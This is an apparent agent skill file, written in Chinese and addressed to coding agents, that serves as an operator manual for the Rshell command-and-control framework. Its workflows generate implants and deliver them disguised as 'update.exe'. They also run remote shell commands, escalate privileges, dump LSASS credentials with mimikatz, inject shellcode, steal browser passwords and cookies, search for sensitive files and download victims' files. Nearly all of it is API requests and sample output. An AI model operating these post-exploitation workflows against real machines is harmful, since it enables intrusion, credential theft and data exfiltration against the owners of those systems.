---
name: rshell-c2
description: Rshell C2 框架 — 客户端管理、命令执行、文件操作、凭据抓取、后渗透
license: MIT
compatibility: opencode, claude-code, cursor
metadata:
  audience: agents
  domain: c2
---

# Rshell C2 控制端操作指南

## 概述

Rshell 是一个多协议 C2 框架，支持：
- 多协议监听器（WebSocket / TCP / KCP / HTTP / OSS）
- 跨平台植入端（Windows / Linux / macOS）
- Windows 内存执行 + Linux 内存执行
- 浏览器密码抓取（Chromium / Firefox）
- 敏感文件搜索
- SOCKS5 代理
- Web Delivery
- 交互式终端（WebSocket + xterm.js）
- 凭据管理

---

## 第一章：认证与鉴权

### 1.1 初始密码获取

服务器首次启动时自动生成随机 admin 密码，打印到 STDERR/Linux 日志：
```
WARN account: admin
WARN password: <自动生成的 20 位随机密码>
```

### 1.2 登录获取 JWT Token

```http
POST /api/users/login
Content-Type: application/json

{
  "username": "admin",
  "password": "<密码>"
}
```

响应：
```json
{
  "code": 200,
  "data": {
    "token": "eyJhbGciOiJIUzI1NiIs...",
    "permissions": 1,
    "refresh": "mock-refresh-token",
    "username": "admin"
  }
}
```

失败响应：
```json
{ "error": "Invalid credentials" }
```

### 1.3 Token 使用方式

JWT Token 有效期 **24 小时**，通过以下方式传递：

```
Authorization2: Bearer <JWT>
```

或作为查询参数：
```
?token=<JWT>
```

**注意**：前端静态页面使用 HTTP Basic Auth（`Authorization` 头部）保护，API 使用  JWT（`Authorization2` 头部），两者互不干扰。

### 1.4 WebSocket 双 Token 认证

交互式终端需要额外的 WebSocket Token：

**第 1 步**：获取 WebSocket Token（需要 JWT 认证）
```http
GET /api/ws/auth/:uid
Authorization2: Bearer <JWT>
```
响应：`{ "token": "<ws-jwt>", "expires_in": 300, "uid": "...", "username": "..." }`

**第 2 步**：连接 WebSocket
```
ws://<host>/api/ws/interactive/:uid/:sessionId?auth=<ws-jwt>
```

WebSocket Token 有效期 **5 分钟**。

---

## 第二章：完整 API 路由参考

### 2.1 客户端管理

#### 获取客户端列表
```http
GET /api/client/clientslist?page=1&page_size=100
Authorization2: Bearer <JWT>
```
响应字段：`Uid`, `FirstStart`, `ExternalIP`, `InternalIP`, `Username`, `Computer`, `Process`, `Pid`, `Address`, `Arch`, `Note`, `Sleep`, `Online`, `Color`

#### 发送命令到客户端
```http
POST /api/client/shell/sendcommand
Authorization2: Bearer <JWT>
Content-Type: application/json

{ "uid": "<客户端UID>", "command": "shell whoami" }
```
支持的命令前缀：
| 前缀 | 功能 | 示例 |
|------|------|------|
| `shell ` | 执行 Shell 命令 | `shell whoami` |
| `cd ` | 切换目录 | `cd C:\Users` |
| `ps` | 列出进程 | `ps` |
| `execute ` | 执行程序 | `execute notepad.exe` |
| `download ` | 下载文件 | `download C:\passwd.txt` |
| `upload ` | 上传文件 | `upload` |
| `screenshot` | 截屏 | `screenshot` |
| `getsystem` | Windows 提权 | `getsystem` |
| `mimikatz` | 抓取凭证 | `mimikatz` |
| `inject ` | 进程注入 | `inject <pid> <shellcode.bin>` |
| `sleep ` | 修改休眠间隔 | `sleep 5` |

响应：返回追加后的 Shell 输出内容。

#### 获取 Shell 输出
```http
GET /api/client/shell/getshellcontent?uid=<客户端UID>
Authorization2: Bearer <JWT>
```
响应：Shell 输出的文本内容。应每 3-5 秒轮询一次获取增量输出。

#### 进程管理
```http
GET  /api/client/pid?uid=<UID>                                              → 列出进程（300s 超时等待）
POST /api/client/pid/kill   { "uid": "<UID>", "pid": "<PID>" }             → 杀进程
```

#### 文件操作
```http
POST /api/client/file/tree      { "uid": "<UID>", "dirPath": "<路径>" }    → 浏览目录（300s 超时）
POST /api/client/file/delete    { "uid": "<UID>", "filePath": "<路径>" }   → 删除文件
POST /api/client/file/mkdir     { "uid": "<UID>", "dirPath": "<路径>" }    → 创建目录
POST /api/client/file/upload    (multipart) file + uid + uploadPath        → 上传文件
POST /api/client/file/download  { "uid": "<UID>", "filePath": "<路径>" }   → 下载文件（触发）
GET  /api/client/downloads/info?uid=<UID>                                    → 下载进度
POST /api/client/downloads/downloaded_file { "uid":"<UID>", "filePath":"<路径>" } → 获取已下载文件
GET  /api/client/file/drives?uid=<UID>                                       → 获取驱动器列表（Windows）
POST /api/client/file/filecontent  { "uid": "<UID>", "path": "<路径>" }     → 获取文件内容（300s 超时）
```

#### 客户端控制
```http
GET  /api/client/exit?uid=<UID>         → 断开单个客户端
POST /api/client/batch-exit              → 断开所有客户端
POST /api/client/addnote  { "uid":"<UID>", "note":"<备注>" }  → 添加备注
POST /api/client/sleep   { "uid":"<UID>", "sleep":"<秒数>" }  → 修改休眠
POST /api/client/color   { "uid":"<UID>", "color":"<颜色>" }  → 修改显示颜色
```

#### 客户端备注
```http
GET  /api/client/note/get?uid=<UID>     → 获取备注
POST /api/client/note/save { "uid":"<UID>", "noteContent":"<内容>" }  → 保存备注
```

#### 屏幕截图
```http
POST /api/client/screenshot/capture  { "uid": "<UID>" }         → 触发截图
GET  /api/client/screenshot/list?uid=<UID>                        → 截图列表
GET  /api/client/screenshot/image?id=<截图ID>                      → 获取截图图片（返回 PNG）
```

#### 凭据信息
```http
POST /api/client/credentials/add_from_implant  (implant internal, not for direct use)
```

---

### 2.2 监听器管理

```http
POST /api/listener/add    { "type":"websocket|tcp|kcp|http|oss", "listenAddress":"0.0.0.0:8080", "connectAddress":"1.2.3.4:8080" }
GET  /api/listener/list
POST /api/listener/open   { "listenAddress": "<地址>" }
POST /api/listener/close  { "listenAddress": "<地址>" }
POST /api/listener/delete { "listenAddress": "<地址>" }
```

监听器类型：`websocket`, `tcp`, `kcp`, `http`, `oss`

---

### 2.3 Web Delivery

```http
GET  /api/webdelivery/list
POST /api/webdelivery/start  { "listener":"<监听器>", "os":"windows|linux", "arch":"amd64|386", "port":"<端口>", "filename":"<文件名>", "pass":"<密码>" }
POST /api/webdelivery/close  { "port": "<端口>" }
POST /api/webdelivery/open   { "port": "<端口>" }
POST /api/webdelivery/delete { "port": "<端口>" }
```

---

### 2.4 SOCKS5 代理

所有 SOCKS5 端点接受相同格式：
```json
{ "uid": "<UID>", "Socks5port": "<端口>", "UserName": "<用户名>", "Password": "<密码>" }
```
```http
GET  /api/socks5/list?uid=<UID>
POST /api/socks5/start
POST /api/socks5/open
POST /api/socks5/close
POST /api/socks5/delete
```

---

### 2.5 二进制执行

#### Windows 内存执行（4 种模式）
```http
POST /api/bin/execute
Content-Type: multipart/form-data

file: <二进制文件>
uid: "<UID>"
args: "<参数>"
mode: "execute-assembly|inline-bin|shellcode-inject|inline-execute"
```
| mode | 说明 |
|------|------|
| `execute-assembly` | .NET 程序集内存加载 |
| `inline-bin` | 原生二进制内存加载（Donut 转 shellcode） |
| `shellcode-inject` | 注入原始 Shellcode |
| `inline-execute` | BOF (Beacon Object File) 执行 |

#### Linux 脚本执行
```http
POST /api/bin/executelinuxscript  (multipart) file + uid + args
```

#### Linux 内存执行
```http
POST /api/bin/executelinuxbin     (multipart) file + uid + args
```
流程：上传 → 写入 `/tmp/.*` → chmod +x → 执行 → 进程运行中删除临时文件。

---

### 2.6 浏览器密码抓取

```http
POST /api/client/dumpbrowser   { "uid": "<UID>" }        → 触发抓取
GET  /api/dumpbrowser/list/:uid                             → 结果列表
DELETE /api/dumpbrowser/delete/:id                           → 删除结果
```

注意：结果以 JSON 格式上报，每条记录的 `content` 字段包含 `{"browser":"Chrome","category":"password","entries":[...]}`。

---

### 2.7 敏感信息搜索

```http
POST /api/client/searchsensitive   { "uid":"<UID>", "path":"<路径>" }  → 触发搜索
GET  /api/sensitive/list/:uid                                             → 搜索结果列表
GET  /api/sensitive/content/:id                                           → 查看详情
DELETE /api/sensitive/delete/:id                                          → 删除结果
```

---

### 2.8 植入端生成

```http
POST /api/client/GenServer  { "osType":"windows|linux|darwin", "archType":"amd64|386", "listener":"<监听器名>", "pass":"<加密密码>" }
GET  /api/client/listener/list
```

`osType` 支持：`windows`, `linux`, `darwin`
`archType` 支持：`amd64`, `386`
`listener` 格式：从 GET `/api/client/listener/list` 获取，例如 `websocket://1.2.3.4:8080`
`pass`：客户端密码，**生成后不可修改**

**运行生成的植入端：**

生成的植入端文件（如 `r_windows_amd64.exe`）需要在目标机器上运行时传入 password 作为命令行参数：
```
# Windows
r_windows_amd64.exe <password>

# Linux
./r_linux_amd64 <password>

# macOS
./r_darwin_amd64 <password>
```

> **注意**：`pass` 字段不能为空。如果生成时指定了密码，运行时不传或传错密码，客户端会直接退出不连接服务器。密码被填充到二进制文件中的 `PASSAAAA...` 占位符位置（编译时嵌入的 `config.ExecuteKey` 字段），生成后无法修改密码，需要重新生成客户端。`osType` 和 `archType` 必须与构建时编译的植入端平台匹配，否则无法找到对应二进制文件。

---

### 2.9 Shellcode 生成

```http
POST /api/shellcode/stage  { "listener":"<监听器>", "port":"<端口>", "format":"hex|bin|c|exe" }
```

---

### 2.10 插件

```http
GET  /api/plugin/list
POST /api/plugin/add        (multipart) name + os + type + file
POST /api/plugin/delete     { "id": <int64> }
POST /api/plugin/execute    { "id": <int64>, "uid": "<UID>", "args": "<参数>" }
```

---

### 2.11 凭据管理

```http
GET  /api/credentials/list
POST /api/credentials/add   { "uid":"<UID>", "target":"<目标>", "username":"<用户名>", "secret":"<密码>", "cred_type":"<类型>", "source":"<来源>", "notes":"<备注>" }
GET  /api/credentials/delete?id=<ID>
GET  /api/credentials/dumps?uid=<UID>
GET  /api/credentials/dump/download?id=<ID>
```

---

### 2.12 设置

```http
GET  /api/settings/list
POST /api/settings/edit  [ { "name": "<键>", "value": "<值>" }, ... ]
```

预定义设置项：`wecom`, `dingtalk`, `telegram`, `email`（通知配置）。

---

### 2.13 正向连接

```http
POST /api/forward-connection  { "type":"websocket|tcp", "address":"<地址>", "proxy":"<代理地址>" }
```

---

### 2.14 交互式终端

```http
GET /api/ws/interactive/:uid/:sessionId  (WebSocket 升级)
```
需要先通过 `/api/ws/auth/:uid` 获取 WebSocket Token。

---

## 第三章：通用客户端操作流程

### 3.1 首次接入流程

```
1. POST /api/users/login                  → 获取 JWT Token
2. GET  /api/client/clientslist           → 确认目标在线（Online == "1"）
3. POST /api/client/shell/sendcommand     → 发送 shell whoami
4. GET  /api/client/shell/getshellcontent → 查看输出
5. POST /api/client/file/tree             → 浏览 C:\Users\ 或 /home/
6. POST /api/client/file/download         → 下载感兴趣的文件
7. POST /api/client/dumpbrowser           → 抓取浏览器密码
8. GET  /api/dumpbrowser/list/:uid        → 查看结果
```

### 3.2 命令执行完整示例

```http
# Step 1: 登录
POST /api/users/login  {"username":"admin","password":"xxxx"}
→ { "data": { "token": "jwt_xxx" } }

# Step 2: 查看客户端
GET /api/client/clientslist
Authorization2: Bearer jwt_xxx
→ { "data": [{ "Uid": "abc123", "Computer": "DESKTOP-ABC", "Online": "1", ... }] }

# Step 3: 发送命令
POST /api/client/shell/sendcommand
Authorization2: Bearer jwt_xxx
{"uid":"abc123","command":"shell whoami"}
→ { "data": "$ shell whoami\nnt authority\\system\n" }

# Step 4: 执行程序
POST /api/client/shell/sendcommand
{"uid":"abc123","command":"execute cmd.exe /c ipconfig"}

# Step 5: 轮询输出
GET /api/client/shell/getshellcontent?uid=abc123
→ "$ execute cmd.exe /c ipconfig\n\nWindows IP 配置\n...\n\n"
```

### 3.3 文件浏览与下载

```http
# 浏览目录
POST /api/client/file/tree {"uid":"abc123","dirPath":"C:\\Users\\"}
→ 300s 内轮询响应

# 下载文件
POST /api/client/file/download {"uid":"abc123","filePath":"C:\\Users\\admin\\Desktop\\passwords.txt"}
→ 下载任务创建

# 查看下载进度
GET /api/client/downloads/info?uid=abc123

# 获取已下载文件
POST /api/client/downloads/downloaded_file {"uid":"abc123","filePath":"<返回的路径>"}
→ 返回文件内容
```

### 3.4 浏览器密码抓取流程

```http
# 1. 启动抓取
POST /api/client/dumpbrowser {"uid":"abc123"}
→ { "status": 200 }

# 2. 等待抓取完成（植入端异步执行，约 10-60 秒）
# 3. 查看结果
GET /api/dumpbrowser/list/abc123
→ { "data": [
    { "id": 1, "browserName": "Chrome", "category": "password",
      "content": "{\"browser\":\"Chrome\",\"category\":\"password\",\"entries\":[{\"url\":\"https://example.com\",\"username\":\"admin\",\"password\":\"secret123\",\"created_at\":\"...\"}]}" },
    { "id": 2, "browserName": "Edge", "category": "cookie", ... }
  ] }

# 4. 删除结果
DELETE /api/dumpbrowser/delete/1
```

### 3.5 内存执行二进制

```http
# Windows 内存执行（无文件落地）
POST /api/bin/execute
Content-Type: multipart/form-data
Authorization2: Bearer jwt_xxx
  file: @mimikatz.exe
  uid: "abc123"
  args: ""
  mode: "inline-bin"

# Linux 内存执行（tmp 落地执行后自动删除）
POST /api/bin/executelinuxbin
Content-Type: multipart/form-data
  file: @fscan
  uid: "abc123"
  args: "-h 192.168.1.0/24"
```

### 3.6 敏感信息搜索

```http
# 启动搜索
POST /api/client/searchsensitive {"uid":"abc123","path":"C:\\Users\\admin\\"}
→ { "status": 200 }
# 结果流式返回，约数分钟完成
# 查看结果
GET /api/sensitive/list/abc123
GET /api/sensitive/content/1
```

### 3.7 Windows 后渗透

```http
# Token 窃取提权
POST /api/client/shell/sendcommand {"uid":"abc123","command":"getsystem"}

# 抓取 LSASS 凭据
POST /api/client/shell/sendcommand {"uid":"abc123","command":"mimikatz"}

# 进程注入
POST /api/client/shell/sendcommand {"uid":"abc123","command":"inject <pid> <shellcode_path>"}
```

### 3.8 启动监听器

```http
# 添加 WebSocket 监听器
POST /api/listener/add
{"type":"websocket","listenAddress":"0.0.0.0:8080","connectAddress":"1.2.3.4:8080"}

# 查看所有监听器
GET /api/listener/list

# 关闭监听器
POST /api/listener/close {"listenAddress":"0.0.0.0:8080"}

# 删除监听器
POST /api/listener/delete {"listenAddress":"0.0.0.0:8080"}
```

### 3.9 Web Delivery 投递植入端

```http
POST /api/webdelivery/start
{"listener":"websocket","os":"windows","arch":"amd64","port":"9999","filename":"update.exe","pass":"encrypt_key"}
→ 启动 HTTP 服务在指定端口提供植入端下载
→ 目标机器访问 http://<server>:9999/update.exe 即可下载
```

---

## 第四章：常见问题

### 4.1 Token 过期

JWT 有效期 24 小时。过期后 API 返回 401，需重新调用 `/api/users/login` 获取新 Token。

### 4.2 客户端不在线

`Online` 字段表示客户端状态：
- `"1"` = 在线
- `"2"` = 离线（已设置）
- `"0"` = 初始状态

只有在线的客户端才能接收命令。

### 4.3 命令输出为空

某些命令执行需要时间（如 `ps`），输出通过异步轮询获取。建议每 3-5 秒轮询一次 `/api/client/shell/getshellcontent`。

### 4.4 长时间操作的超时

文件浏览、进程列表等操作有 300 秒（5 分钟）的超时等待。如果植入端在该时间内未响应，操作会失败。

### 4.5 Windows 内存执行失败

确认目标启用 `-tags abe_embed` 编译以获得 Chrome 127+ 的 ABE 密钥支持。无此标记时 V20 加密的密码无法解密。
